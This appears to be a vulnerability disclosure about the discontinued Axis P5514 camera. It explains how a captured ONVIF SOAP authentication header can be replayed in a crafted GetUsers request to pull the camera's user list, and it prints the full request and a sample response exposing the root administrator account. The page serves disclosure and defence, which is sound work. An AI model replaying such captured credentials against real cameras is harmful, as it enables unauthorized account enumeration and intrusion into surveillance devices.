# getusers Vulnerability of Axis 5514 Camera 


This page shows the details of the vulnerability found in AXIS 5514 Camera. AXIX-P5514 is not on sale now, but maybe some of them are still in use. 


Description

The attacker can remotely get user information of Axis camera 5514 without permission by a customized message. In order to customize and inject attacking messages, a PoC with C++ Language was developed to modify captured request messages with function “Getusers” in <Soap:Body> under the ONVIF specification. The PoC source code "axis_5514_getusers.cpp" is also posted here. The raw message was captured on line by Wireshark. And I got the SOAP packets from client to the  AXIS-P5514 camera, and filtered out the authentication information in SOAP head, such as: <wsse:UsernameToken><wsse:Username> username </wsse:Username><wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest">keys</wsse:Password><wsse:Nonce>8eVIq85lxOn5IcBPVdiyvQ==</wsse:Nonce><wsu:Created>20XX-03-12T09:12:15Z</wsu:Created></wsse:UsernameToken>. After capturing such packets, use the authentication information above to customize a message with function “Getusers” in <Soap:Body> and then send the modified message to the AXIS-P5514 camera. Then the Axis 5514 camera can return all the user information in the response message. 

The customized message is likely as follow.
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tds="http://www.onvif.org/ver10/device/wsdl" xmlns:tt="http://www.onvif.org/ver10/schema">  <s:Header xmlns:s="http://www.w3.org/2003/05/soap-envelope">    
<wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/ oasis-200401-wss-wssecurity-utility-1.0.xsd">      
<wsse:UsernameToken>        
<wsse:Username>username</wsse:Username>        
<wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest">keys</wsse:Password><wsse:Nonce>8eVIq85lxOn5IcBPVdiyvQ==</wsse:Nonce>        
<wsu:Created>20XX-03-12T09:12:15Z</wsu:Created>      
</wsse:UsernameToken>   
 </wsse:Security>  
</s:Header>  
  <soap:Body>
    <tds:GetUsers />
  </soap:Body>
</soap:Envelope>

the response message is likely as follow.

HTTP/1.1 200 OK
Server: gSOAP/2.7
Content-Type: application/soap+xml; charset=utf-8
Content-Length: 3020
Connection: close
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:c14n="http://www.w3.org/2001/10/xml-exc-c14n#" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsa5="http://www.w3.org/2005/08/addressing" xmlns:xmime="http://tempuri.org/xmime.xsd" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:wsrfbf="http://docs.oasis-open.org/wsrf/bf-2" xmlns:wstop="http://docs.oasis-open.org/wsn/t-1" xmlns:tt="http://www.onvif.org/ver10/schema" xmlns:acert="http://www.axis.com/vapix/ws/cert" xmlns:wsrfr="http://docs.oasis-open.org/wsrf/r-2" xmlns:aa="http://www.axis.com/vapix/ws/action1" xmlns:acertificates="http://www.axis.com/vapix/ws/certificates" xmlns:aentry="http://www.axis.com/vapix/ws/entry" xmlns:aev="http://www.axis.com/vapix/ws/event1" xmlns:aeva="http://www.axis.com/vapix/ws/embeddedvideoanalytics1" xmlns:ali1="http://www.axis.com/vapix/ws/light/CommonBinding" xmlns:ali2="http://www.axis.com/vapix/ws/light/IntensityBinding" xmlns:ali3="http://www.axis.com/vapix/ws/light/AngleOfIlluminationBinding" xmlns:ali4="http://www.axis.com/vapix/ws/light/DayNightSynchronizeBinding" xmlns:ali="http://www.axis.com/vapix/ws/light" xmlns:apc="http://www.axis.com/vapix/ws/panopsiscalibration1" xmlns:arth="http://www.axis.com/vapix/ws/recordedtour1" xmlns:ascm="http://www.axis.com/vapix/ws/siblingcameramonitor1" xmlns:asd="http://www.axis.com/vapix/ws/shockdetection" xmlns:aweb="http://www.axis.com/vapix/ws/webserver" xmlns:tan1="http://www.onvif.org/ver20/analytics/wsdl/RuleEngineBinding" xmlns:tan2="http://www.onvif.org/ver20/analytics/wsdl/AnalyticsEngineBinding" xmlns:tan="http://www.onvif.org/ver20/analytics/wsdl" xmlns:tds="http://www.onvif.org/ver10/device/wsdl" xmlns:tev1="http://www.onvif.org/ver10/events/wsdl/NotificationProducerBinding" xmlns:tev2="http://www.onvif.org/ver10/events/wsdl/EventBinding" xmlns:tev3="http://www.onvif.org/ver10/events/wsdl/SubscriptionManagerBinding" xmlns:wsnt="http://docs.oasis-open.org/wsn/b-2" xmlns:tev4="http://www.onvif.org/ver10/events/wsdl/PullPointSubscriptionBinding" xmlns:tev="http://www.onvif.org/ver10/events/wsdl" xmlns:timg="http://www.onvif.org/ver20/imaging/wsdl" xmlns:tptz="http://www.onvif.org/ver20/ptz/wsdl" xmlns:trt="http://www.onvif.org/ver10/media/wsdl" xmlns:ter="http://www.onvif.org/ver10/error" xmlns:tns1="http://www.onvif.org/ver10/topics" xmlns:tnsaxis="http://www.axis.com/2009/event/topics"><SOAP-ENV:Header></SOAP-ENV:Header><SOAP-ENV:Body><tds:GetUsersResponse><tds:User><tt:Username>root</tt:Username><tt:UserLevel>Administrator</tt:UserLevel></tds:User></tds:GetUsersResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>





References

https://www.axis.com/products/axis-p5514-e
